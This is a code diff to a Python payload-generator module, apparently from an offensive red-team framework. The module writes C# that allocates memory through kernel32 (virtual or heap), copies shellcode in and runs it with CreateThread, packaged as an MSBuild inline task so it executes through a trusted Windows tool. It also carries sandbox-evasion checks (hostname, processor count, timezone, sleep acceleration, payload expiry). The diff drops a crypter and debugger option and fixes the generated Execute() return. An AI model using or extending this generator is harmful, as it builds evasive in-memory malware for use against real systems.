@@ -38,8 +38,6 @@ class PayloadModule:
 
         # options we require user ineraction for- format is {OPTION : [Value, Description]]}
         self.required_options = {
-                                    "COMPILE_TO_EXE" : ["N", "Compile to an executable"],
-                                    "USE_ARYA"       : ["N", "Use the Arya crypter"],
                                     "INJECT_METHOD"  : ["Virtual", "Virtual or Heap"],
                                     "EXPIRE_PAYLOAD" : ["X", "Optional: Payloads expire after \"Y\" days"],
                                     "HOSTNAME"       : ["X", "Optional: Required system hostname"],
@@ -47,7 +45,6 @@ class PayloadModule:
                                     "PROCESSORS"     : ["X", "Optional: Minimum number of processors"],
                                     "TIMEZONE"       : ["X", "Optional: Check to validate not in UTC"],
                                     "USERNAME"       : ["X", "Optional: The required user account"],
-                                    "DEBUGGER"       : ["X", "Optional: Check if debugger is attached"],
                                     "SLEEP"          : ["X", "Optional: Sleep \"Y\" seconds, check if accelerated"]
                                 }
 
@@ -107,8 +104,6 @@ class PayloadModule:
         elif self.required_options["INJECT_METHOD"][0].lower() == "heap":
             payload_code += """\t\t[DllImport(\"kernel32\")] private static extern UInt32 HeapCreate(UInt32 %s, UInt32 %s, UInt32 %s); \n[DllImport(\"kernel32\")] private static extern UInt32 HeapAlloc(UInt32 %s, UInt32 %s, UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 RtlMoveMemory(UInt32 %s, byte[] %s, UInt32 %s);\n[DllImport(\"kernel32\")] private static extern IntPtr CreateThread(UInt32 %s, UInt32 %s, UInt32 %s, IntPtr %s, UInt32 %s, ref UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr %s, UInt32 %s);"""%(y[0],y[1],y[2],y[3],y[4],y[5],y[6],y[7],y[8],y[9],y[10],y[11],y[12],y[13],y[14],y[15],y[16])
 
-        payload_code += '\t' * 3 + "public override bool Execute()\n"
-        payload_code += '\t' * 3 + "{\n"
         payload_code2, num_tabs_required = gamemaker.senecas_games(self)
         payload_code = payload_code + payload_code2
         num_tabs_required += 2
@@ -120,8 +115,6 @@ class PayloadModule:
             payload_code += '\t' * num_tabs_required + "IntPtr %s = IntPtr.Zero; UInt32 %s = 0; IntPtr %s = IntPtr.Zero;\n" %(hThreadName, threadIdName, pinfoName)
             payload_code += '\t' * num_tabs_required + "%s = CreateThread(0, 0, %s, %s, 0, ref %s);\n" % (hThreadName, funcAddrName, pinfoName, threadIdName)
             payload_code += '\t' * num_tabs_required + "WaitForSingleObject(%s, 0xFFFFFFFF);\n" % (hThreadName)
-
-            # payload_code += "private static UInt32 MEM_COMMIT = 0x1000; private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;\n"
 
         elif self.required_options["INJECT_METHOD"][0].lower() == "heap":
 
@@ -135,19 +128,17 @@ class PayloadModule:
             payload_code += '\t' * num_tabs_required + 'RtlMoveMemory({}, {}, (UInt32){}.Length);\n'.format(rand_ptr, bytearrayName, bytearrayName)
             payload_code += '\t' * num_tabs_required + 'UInt32 {} = 0;\n'.format(rand_var)
             payload_code += '\t' * num_tabs_required + 'IntPtr {} = CreateThread(0, 0, {}, IntPtr.Zero, 0, ref {});\n'.format(hThreadName, rand_ptr, rand_var)
-            payload_code += '\t' * num_tabs_required + 'WaitForSingleObject({}, 0xFFFFFFFF);}}\n'.format(hThreadName)
-
-        import bpdb
-        bpdb.set_trace()
-        payload_code += '\t' * num_tabs_required + "return true;"
+            payload_code += '\t' * num_tabs_required + 'WaitForSingleObject({}, 0xFFFFFFFF);\n'.format(hThreadName)
 
         while (num_tabs_required != 0):
-            payload_code += '\t' * num_tabs_required + '}'
-            num_tabs_required -= 1
-
-        if self.required_options["USE_ARYA"][0].lower() == "y":
-            payload_code = encryption.arya(payload_code)
-
+            if num_tabs_required == 2:
+                # return true for the msbuild Execute() function
+                payload_code += "\nreturn true;"
+                payload_code += '\t' * num_tabs_required + '}'
+                num_tabs_required -= 1
+            else:
+                payload_code += '\t' * num_tabs_required + '}'
+                num_tabs_required -= 1
 
         payload_code += "\n\t\t\t\t]]>\n\t\t\t</Code>\n\t\t</Task>\n\t</UsingTask>\n</Project>"
         payload_code = msbuild_header + payload_code
